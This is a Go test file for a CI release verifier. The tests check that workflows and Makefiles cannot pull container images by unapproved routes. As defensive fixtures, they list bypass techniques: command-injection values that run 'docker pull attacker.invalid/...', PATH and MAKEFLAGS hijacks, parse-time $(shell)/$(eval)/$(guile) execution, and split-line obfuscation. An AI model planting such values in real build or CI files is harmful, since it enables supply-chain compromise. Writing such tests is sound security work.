package releaseverify

import (
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"slices"
	"strings"
	"testing"

	"github.com/loomarr/loomarr/internal/testkit"
)

func TestVerifyCIContainerDownloadsRejectsPostgresAcquisitionInAnyWorkflow(t *testing.T) {
	tests := map[string]string{
		"service": `name: extra
on: push
jobs:
  extra:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:17-alpine
    steps:
      - run: echo safe
`,
		"job container": `name: extra
on: push
jobs:
  extra:
    runs-on: ubuntu-latest
    container: ${{ env.POSTGRES_IMAGE }}
    steps:
      - run: echo safe
`,
		"job container via image environment": `name: extra
on: push
env:
  DB_IMAGE: postgres:17-alpine
jobs:
  extra:
    runs-on: ubuntu-latest
    container: ${{ env.DB_IMAGE }}
    steps:
      - run: echo safe
`,
		"direct pull": `name: extra
on: push
jobs:
  extra:
    runs-on: ubuntu-latest
    steps:
      - run: docker pull postgres:17-alpine
`,
		"opaque Postgres pull": `name: extra
on: push
jobs:
  extra:
    runs-on: ubuntu-latest
    steps:
      - run: docker pull "${{ env.POSTGRES_IMAGE }}"
`,
		"test-pg outside owned workflow": `name: extra
on: push
jobs:
  extra:
    runs-on: ubuntu-latest
    steps:
      - run: make test-pg
`,
		"postgres docker action": `name: extra
on: push
jobs:
  extra:
    runs-on: ubuntu-latest
    steps:
      - uses: docker://postgres:17-alpine
`,
	}
	for name, workflow := range tests {
		t.Run(name, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-extra.yml"), workflow)
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted Postgres acquisition outside ci-postgres.yml")
			}
		})
	}
}

func TestVerifyCIContainerDownloadsRejectsWorkflowAcquisitionOutsideMakeRoute(t *testing.T) {
	tests := map[string]string{
		"helper with opaque image": `name: extra
on: push
jobs:
  extra:
    runs-on: ubuntu-latest
    steps:
      - run: ./scripts/ensure-container-image.sh "${{ env.IMAGE }}"
`,
		"engine with opaque image": `name: extra
on: push
jobs:
  extra:
    runs-on: ubuntu-latest
    steps:
      - run: docker pull "${{ env.IMAGE }}"
`,
		"folded engine command": `name: extra
on: push
jobs:
  extra:
    runs-on: ubuntu-latest
    steps:
      - run: >-
          docker
          pull
          "${{ env.IMAGE }}"
`,
		"opaque engine variable": `name: extra
on: push
jobs:
  extra:
    runs-on: ubuntu-latest
    steps:
      - run: |
          runtime=docker
          "$runtime" pull "$IMAGE"
`,
		"unknown engine variable": `name: extra
on: push
jobs:
  extra:
    runs-on: ubuntu-latest
    steps:
      - run: '"$CONTAINER_ENGINE" pull "$IMAGE"'
`,
		"docker protocol action": `name: extra
on: push
jobs:
  extra:
    runs-on: ubuntu-latest
    steps:
      - uses: docker://${{ env.IMAGE }}
`,
		"opaque service image": `name: extra
on: push
jobs:
  extra:
    runs-on: ubuntu-latest
    services:
      database:
        image: ${{ env.IMAGE }}
    steps:
      - run: echo safe
`,
		"opaque job container": `name: extra
on: push
jobs:
  extra:
    runs-on: ubuntu-latest
    container: ${{ env.IMAGE }}
    steps:
      - run: echo safe
`,
	}
	for name, workflow := range tests {
		t.Run(name, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-extra.yml"), workflow)
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted workflow-side container acquisition")
			}
		})
	}
}

func TestVerifyCIContainerDownloadsRejectsMakeExecutionControls(t *testing.T) {
	mutations := map[string]string{
		"shell":                   "SHELL := /bin/true\n",
		"shell flags":             ".SHELLFLAGS := -c\n",
		"make executable":         "MAKE := true\n",
		"Go executable":           "GO := true\n",
		"Go flags":                "GOFLAGS := -run=^$\n",
		"Cargo executable":        "CARGO := true\n",
		"exported path":           "export PATH := ./attacker\n",
		"make flags":              "MAKEFLAGS := -n\n",
		"override make flags":     "override MAKEFLAGS := -n\n",
		"exported make flags":     "export MAKEFLAGS := -n\n",
		"override exported flags": "override export MAKEFLAGS := -n\n",
		"GNU make flags":          "GNUMAKEFLAGS := -n\n",
		"legacy make flags":       "MFLAGS := -n\n",
		"injected Make sources":   "MAKEFILES := attacker.mk\n",
		"unexported make flags":   "unexport MAKEFLAGS\n",
		"target-private shell":    "test-pg: private SHELL := /bin/true\n",
		"defined make flags":      "define MAKEFLAGS\n-n\nendef\n",
		"one shell":               ".ONESHELL:\n",
		"ignored recipe failures": ".IGNORE:\n",
		"silent recipes":          ".SILENT:\n",
		"secondary expansion":     ".SECONDEXPANSION:\n",
		"export every variable":   ".EXPORT_ALL_VARIABLES:\n",
		"alternate recipe prefix": ".RECIPEPREFIX := >\n",
		"dynamic evaluation":      "$(eval MAKEFLAGS := -n)\n",
		"unapproved include":      "include attacker.mk\n",
	}
	for name, mutation := range mutations {
		t.Run(name, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			makefilePath := filepath.Join(root, "Makefile")
			writeFixtureFile(t, makefilePath, mutation+readFixtureFile(t, makefilePath))
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted a Make execution-control bypass")
			}
		})
	}
}

func TestVerifyCIContainerDownloadsRejectsConditionalMakeGraphDivergence(t *testing.T) {
	tests := map[string]struct {
		module string
		active string
	}{
		"Postgres protected graph hidden in inactive conditional": {
			module: "store.mk",
			active: ".PHONY: test-pg\ntest-pg:\n",
		},
		"Playwright protected graph hidden in inactive conditional": {
			module: "frontend.mk",
			active: `.PHONY: fe-visual fe-visual-update e2e tuner-e2e e2e-update
fe-visual:
fe-visual-update:
e2e:
tuner-e2e:
e2e-update:
`,
		},
	}
	for name, test := range tests {
		t.Run(name, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			path := filepath.Join(root, "mk", test.module)
			source := readFixtureFile(t, path)
			writeFixtureFile(t, path, "ifeq (1,0)\n"+source+"endif\n"+test.active)
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted a conditionally inactive protected Make graph")
			}
		})
	}
}

func TestVerifyCIContainerDownloadsRejectsContinuedMakeRecipeAcquisition(t *testing.T) {
	tests := map[string]string{
		"authorized target": `.PHONY: android
android:
	do\
	cker pull attacker.invalid/image:pinned
`,
		"dependency closure": `.PHONY: android acquire
android: acquire
	@true
acquire:
	do\
	cker pull attacker.invalid/image:pinned
`,
		"continued helper": `.PHONY: android
android:
	./scripts/ensure-contai\
	ner-image.sh attacker.invalid/image:pinned
`,
	}
	for name, makeSource := range tests {
		t.Run(name, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			path := filepath.Join(root, "mk", "android.mk")
			writeFixtureFile(t, path, makeSource)
			makefilePath := filepath.Join(root, "Makefile")
			writeFixtureFile(t, makefilePath, readFixtureFile(t, makefilePath)+"include mk/android.mk\n")
			writeFixtureFile(t, filepath.Join(root, ".github", "workflows", "ci-android.yml"), `name: android
on: push
env:
  GO_VERSION: "1.27"
  NODE_VERSION: "22"
jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - run: make android
`)
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted acquisition split across continued Make recipe lines")
			}
		})
	}
}

func TestVerifyCIContainerDownloadsRejectsUnauditedMakeDirectives(t *testing.T) {
	mutations := map[string]string{
		"ifeq":                 "ifeq (1,1)\nendif\n",
		"leading-space ifneq":  "  ifneq (1,0)\n  endif\n",
		"ifdef":                "ifdef GO\nendif\n",
		"ifndef":               "ifndef UNSET_FIXTURE\nendif\n",
		"else":                 "ifeq (1,1)\nelse\nendif\n",
		"else-if conditional":  "ifeq (1,0)\nelse ifneq (1,0)\nendif\n",
		"unmatched endif":      "endif\n",
		"defined conditional":  "define CONDITIONAL\nifeq (1,0)\nendif\nendef\n",
		"exported define":      "export define EXPORTED\nvalue\nendef\n",
		"arbitrary override":   "override PW_IMAGE := attacker.invalid/image:pinned\n",
		"arbitrary export":     "export PW_IMAGE := attacker.invalid/image:pinned\n",
		"arbitrary unexport":   "unexport PW_IMAGE\n",
		"arbitrary private":    "private PW_IMAGE := attacker.invalid/image:pinned\n",
		"arbitrary undefine":   "undefine PW_IMAGE\n",
		"logical continuation": "PW_IMAGE \\\n := attacker.invalid/image:pinned\n",
	}
	for name, mutation := range mutations {
		t.Run(name, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			makefilePath := filepath.Join(root, "Makefile")
			writeFixtureFile(t, makefilePath, mutation+readFixtureFile(t, makefilePath))
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted an unaudited Make directive")
			}
		})
	}
}

func TestVerifyCIContainerDownloadsRejectsParseTimeMakeExecution(t *testing.T) {
	mutations := map[string]string{
		"parenthesized shell":              `SIDE_EFFECT := $(shell printf harmless)`,
		"braced shell":                     `SIDE_EFFECT := ${shell printf harmless}`,
		"parenthesized shell whitespace":   `SIDE_EFFECT := $(shell    printf harmless)`,
		"braced shell whitespace":          `SIDE_EFFECT := ${shell    printf harmless}`,
		"parenthesized eval":               `SIDE_EFFECT := $(eval HIDDEN := harmless)`,
		"braced eval":                      `SIDE_EFFECT := ${eval HIDDEN := harmless}`,
		"parenthesized eval whitespace":    `SIDE_EFFECT := $(eval    HIDDEN := harmless)`,
		"braced eval whitespace":           `SIDE_EFFECT := ${eval    HIDDEN := harmless}`,
		"parenthesized file":               `SIDE_EFFECT := $(file >harmless-marker,proof)`,
		"parenthesized file whitespace":    `SIDE_EFFECT := $(file    >harmless-marker,proof)`,
		"braced file":                      `SIDE_EFFECT := ${file >harmless-marker,proof}`,
		"Guile":                            `SIDE_EFFECT := $(guile (system "true"))`,
		"Guile whitespace":                 `SIDE_EFFECT := $(guile    (system "true"))`,
		"shell assignment":                 `SIDE_EFFECT != printf harmless`,
		"dynamically named shell function": "FUNCTION := shell\nSIDE_EFFECT := $(call $(FUNCTION),printf harmless)",
		"constructed shell function name":  "LEFT := sh\nRIGHT := ell\nSIDE_EFFECT := $(call $(LEFT)$(RIGHT),printf harmless)",
		"dynamically named eval function":  "FUNCTION := eval\nSIDE_EFFECT := $(call $(FUNCTION),HIDDEN := harmless)",
		"nested shell in pure function":    `SIDE_EFFECT := $(if yes,$(shell printf harmless),)`,
		"shell hidden in allowed variable": `PW_REAL_CI ?= $(shell printf harmless)`,
	}
	for name, mutation := range mutations {
		t.Run(name, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			makefilePath := filepath.Join(root, "Makefile")
			writeFixtureFile(t, makefilePath, mutation+"\n"+readFixtureFile(t, makefilePath))
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted parse-time Make execution")
			}
		})
	}
}

func TestParseTimeMakeExecutionProbesAreRealGNUmakeRedCases(t *testing.T) {
	forms := map[string]string{
		"shell parenthesis": "SIDE_EFFECT := $(shell touch %s)",
		"shell braces":      "SIDE_EFFECT := ${shell touch %s}",
		"eval parenthesis":  "SIDE_EFFECT := $(eval MARKER := touched)",
		"eval braces":       "SIDE_EFFECT := ${eval MARKER := touched}",
		"file":              "SIDE_EFFECT := $(file >%s,touched)",
		"guile":             "SIDE_EFFECT := $(guile (system \"touch %s\"))",
		"shell assignment":  "SIDE_EFFECT != touch %s",
	}
	for name, format := range forms {
		t.Run(name, func(t *testing.T) {
			marker := filepath.Join(t.TempDir(), "parse-time-executed")
			makefile := filepath.Join(t.TempDir(), "GNUmakefile")
			writeFixtureFile(t, makefile, fmt.Sprintf(format, marker)+"\nprobe:\n\t@printf '%s' '$(.FEATURES)'\n")
			output, err := runGNUmake(t, makefile, "probe")
			if err != nil {
				t.Fatalf("installed GNU Make rejected executable probe: %v\n%s", err, output)
			}
			guileSupported := slices.Contains(strings.Fields(string(output)), "guile")
			_, markerErr := os.Stat(marker)
			if name != "eval parenthesis" && name != "eval braces" && !parseTimeProbeMarkerOK(name, guileSupported, markerErr) {
				t.Fatalf("installed GNU Make did not execute %s: %v", name, markerErr)
			}

			root := writeCIContainerDownloadsFixture(t)
			path := filepath.Join(root, "Makefile")
			writeFixtureFile(t, path, fmt.Sprintf(format, marker)+"\n"+readFixtureFile(t, path))
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatalf("VerifyCIContainerDownloads accepted executable %s", name)
			}
		})
	}
}

func parseTimeProbeMarkerOK(name string, guileSupported bool, markerErr error) bool {
	if name == "guile" && !guileSupported {
		return errors.Is(markerErr, os.ErrNotExist)
	}
	return markerErr == nil
}

func TestParseTimeProbeMarkerOK(t *testing.T) {
	tests := []struct {
		name           string
		probe          string
		guileSupported bool
		markerErr      error
		want           bool
	}{
		{name: "no guile and missing marker", probe: "guile", markerErr: os.ErrNotExist, want: true},
		{name: "supported guile and missing marker", probe: "guile", guileSupported: true, markerErr: os.ErrNotExist, want: false},
		{name: "no guile and marker created", probe: "guile", markerErr: nil, want: false},
		{name: "ordinary shell and missing marker", probe: "shell parenthesis", markerErr: os.ErrNotExist, want: false},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			if got := parseTimeProbeMarkerOK(test.probe, test.guileSupported, test.markerErr); got != test.want {
				t.Fatalf("parseTimeProbeMarkerOK(%q, %t, %v) = %t, want %t", test.probe, test.guileSupported, test.markerErr, got, test.want)
			}
		})
	}
}

func TestVerifyCIContainerDownloadsRejectsParseTimeProtectedTargetChanges(t *testing.T) {
	mutations := map[string]string{
		"parenthesized protected target replacement": `$(eval test-pg: ; @:)`,
		"braced protected target replacement":        `${eval test-pg: ; @:}`,
		"parenthesized Docker acquisition":           `SIDE_EFFECT := $(shell docker pull "$(POSTGRES_TEST_IMAGE)")`,
		"braced Docker acquisition":                  `SIDE_EFFECT := ${shell docker pull "${POSTGRES_TEST_IMAGE}"}`,
		"constructed acquisition":                    "FUNCTION := shell\nSIDE_EFFECT := $(call $(FUNCTION),docker pull \"$(POSTGRES_TEST_IMAGE)\")",
		"constructed protected target replacement":   "FUNCTION := eval\nSIDE_EFFECT := $(call $(FUNCTION),test-pg: ; @:)",
	}
	for name, mutation := range mutations {
		t.Run(name, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			makefilePath := filepath.Join(root, "Makefile")
			writeFixtureFile(t, makefilePath, mutation+"\n"+readFixtureFile(t, makefilePath))
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted a parse-time protected-target bypass")
			}
		})
	}
}

func TestVerifyCIContainerDownloadsRequiresExactPlaywrightVariableIsolation(t *testing.T) {
	for name, replacement := range map[string]string{
		"missing":    "",
		"partial":    "unexport PW_DOCKER_USER PW_IMAGE",
		"wrong path": requiredPlaywrightUnexport,
	} {
		t.Run(name, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			frontendPath := filepath.Join(root, "mk", "frontend.mk")
			frontend := readFixtureFile(t, frontendPath)
			if name == "wrong path" {
				writeFixtureFile(t, frontendPath, strings.Replace(frontend, requiredPlaywrightUnexport, "", 1))
				makefilePath := filepath.Join(root, "Makefile")
				writeFixtureFile(t, makefilePath, replacement+"\n"+readFixtureFile(t, makefilePath))
			} else {
				writeFixtureFile(t, frontendPath, strings.Replace(frontend, requiredPlaywrightUnexport, replacement, 1))
			}
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted incomplete Playwright variable isolation")
			}
		})
	}
}

func TestVerifyCIContainerDownloadsRejectsPlaywrightPreImageAssignments(t *testing.T) {
	mutations := map[string]func(string) string{
		"Docker arguments": func(frontend string) string {
			return "PW_DOCKER_USER ?= --pull=always\n" + frontend
		},
		"CI value": func(frontend string) string {
			return "PW_CI ?= 1; docker pull attacker.invalid/image:pinned\n" + frontend
		},
		"runner value": func(frontend string) string {
			return "PW_REAL_CI ?= --pull=always\n" + frontend
		},
		"image override": func(frontend string) string {
			return "PW_IMAGE := attacker.invalid/image:pinned\n" + frontend
		},
		"recursive Docker arguments": func(frontend string) string {
			return "ACQUIRE := --pull=always\nPW_DOCKER_USER ?= $(ACQUIRE)\n" + frontend
		},
	}
	for name, mutate := range mutations {
		t.Run(name, func(t *testing.T) {
			root := writeCIContainerDownloadsFixture(t)
			frontendPath := filepath.Join(root, "mk", "frontend.mk")
			writeFixtureFile(t, frontendPath, mutate(readFixtureFile(t, frontendPath)))
			if err := VerifyCIContainerDownloads(root); err == nil {
				t.Fatal("VerifyCIContainerDownloads accepted an acquisition-affecting Playwright assignment")
			}
		})
	}
}

func TestPlaywrightPlainValuesCannotChangeContainerBoundary(t *testing.T) {
	variables := []string{"PW_DOCKER_USER", "PW_CI", "PW_REAL_CI", "PW_IMAGE", "PW_SHARD"}
	payloads := map[string]string{
		"semicolon":    "--user 0; docker pull attacker.invalid/plain:pinned; docker run --rm",
		"newline":      "--user 0\ndocker pull attacker.invalid/plain:pinned",
		"logical":      "--user 0 && podman pull attacker.invalid/plain:pinned",
		"engine token": "nerdctl pull attacker.invalid/plain:pinned",
	}
	for _, variable := range variables {
		for name, payload := range payloads {
			t.Run("assignment "+variable+" "+name, func(t *testing.T) {
				root := writeCIContainerDownloadsFixture(t)
				frontendPath := filepath.Join(root, "mk", "frontend.mk")
				frontend := readFixtureFile(t, frontendPath)
				writeFixtureFile(t, frontendPath, variable+" := "+payload+"\n"+frontend)
				if err := VerifyCIContainerDownloads(root); err == nil {
					t.Fatal("VerifyCIContainerDownloads accepted a plain acquisition-affecting Playwright value")
				}
			})
		}
	}

}

func TestPlaywrightExternalOverridesHaveNoRecipeExpansionSeam(t *testing.T) {
	_, source, _, _ := runtime.Caller(0)
	root := filepath.Join(filepath.Dir(source), "..", "..")
	frontend, err := readActiveMakefile(filepath.Join(root, "mk", "frontend.mk"))
	if err != nil {
		t.Fatal(err)
	}
	for _, targetName := range playwrightContainerTargets() {
		target := frontend.targets[targetName]
		if target == nil || !slices.Equal(target.recipes, playwrightTargetRecipes(targetName)) {
			t.Fatalf("%s lost its fixed runner recipe", targetName)
		}
		for _, recipe := range target.recipes {
			for variable := range forbiddenPlaywrightMakeVariableAuthorities() {
				if strings.Contains(recipe, "$("+variable+")") || strings.Contains(recipe, "${"+variable+"}") {
					t.Fatalf("%s recipe retained external override seam %s", targetName, variable)
				}
			}
		}
	}
}

func TestPlaywrightContainerRunnerBuildsFixedDockerBoundary(t *testing.T) {
	_, source, _, _ := runtime.Caller(0)
	root := filepath.Join(filepath.Dir(source), "..", "..")
	runner := filepath.Join(root, "scripts", "run-playwright-container.sh")

	t.Run("caller values stay single arguments", func(t *testing.T) {
		result := testkit.RunWithFakeDocker(t, runner, []string{"e2e"}, testkit.FakeDockerConfig{
			Dir: root,
			Environment: []string{
				"GITHUB_ACTIONS=--pull=always;docker pull attacker.invalid/image:pinned",
				"PW_DOCKER_USER=--pull=always",
				"PW_IMAGE=attacker.invalid/image:pinned",
			},
		})
		if result.Err != nil {
			t.Fatalf("runner: %v", result.Err)
		}
		want := [][]string{{
			"run", "--rm", "--ipc=host", "--user", fmt.Sprintf("%d:%d", os.Getuid(), os.Getgid()),
			"-e", "HOME=/tmp", "-e", "CI=1", "-e",
			"GITHUB_ACTIONS=--pull=always;docker pull attacker.invalid/image:pinned",
			"-v", root + ":/work", "-w", "/work/web/apps/web",
			"mcr.microsoft.com/playwright:v1.62.1-noble",
			"node_modules/.bin/playwright", "test", "--config=playwright.e2e.config.ts",
		}}
		if !slices.EqualFunc(result.DockerCommands, want, func(left, right []string) bool {
			return slices.Equal(left, right)
		}) {
			t.Fatalf("docker commands = %#v, want %#v", result.DockerCommands, want)
		}
	})

	for name, payload := range map[string]string{
		"semicolon":    "true; docker pull attacker.invalid/runtime:pinned",
		"newline":      "true\ndocker pull attacker.invalid/runtime:pinned",
		"logical":      "true && podman pull attacker.invalid/runtime:pinned",
		"engine token": "nerdctl pull attacker.invalid/runtime:pinned",
	} {
		t.Run("runner environment "+name, func(t *testing.T) {
			result := testkit.RunWithFakeDocker(t, runner, []string{"e2e"}, testkit.FakeDockerConfig{
				Dir:         root,
				Environment: []string{"GITHUB_ACTIONS=" + payload},
			})
			if result.Err != nil {
				t.Fatalf("runner: %v", result.Err)
			}
			if len(result.DockerCommands) != 1 {
				t.Fatalf("docker commands = %#v, want one", result.DockerCommands)
			}
			command := result.DockerCommands[0]
			if slices.Index(command, "GITHUB_ACTIONS="+payload) < 0 {
				t.Fatalf("runner environment was not one exact argument: %#v", command)
			}
			if slices.Contains(command, "pull") || slices.Contains(command, "--pull=always") ||
				slices.Contains(command, "attacker.invalid/runtime:pinned") {
				t.Fatalf("runner environment injected Docker arguments: %#v", command)
			}
		})
	}

	t.Run("validated shard follows image", func(t *testing.T) {
		result := testkit.RunWithFakeDocker(t, runner, []string{"visual"}, testkit.FakeDockerConfig{
			Dir:         root,
			Environment: []string{"LOOMARR_PLAYWRIGHT_SHARD=--shard=1/4"},
		})
		if result.Err != nil {
			t.Fatalf("runner: %v", result.Err)
		}
		if len(result.DockerCommands) != 1 {
			t.Fatalf("docker commands = %#v, want one", result.DockerCommands)
		}
		command := result.DockerCommands[0]
		image := slices.Index(command, "mcr.microsoft.com/playwright:v1.62.1-noble")
		shard := slices.Index(command, "--shard=1/4")
		if image < 0 || shard <= image {
			t.Fatalf("image/shard boundary = %v", command)
		}
	})

	t.Run("invalid shard never reaches Docker", func(t *testing.T) {
		result := testkit.RunWithFakeDocker(t, runner, []string{"visual"}, testkit.FakeDockerConfig{
			Dir:         root,
			Environment: []string{"LOOMARR_PLAYWRIGHT_SHARD=--shard=1/4;docker pull attacker.invalid/image:pinned"},
		})
		var exitError *exec.ExitError
		if !errors.As(result.Err, &exitError) || exitError.ExitCode() != 2 {
			t.Fatalf("invalid shard error = %v, want status 2", result.Err)
		}
		if len(result.DockerCommands) != 0 {
			t.Fatalf("invalid shard reached Docker: %#v", result.DockerCommands)
		}
	})
}
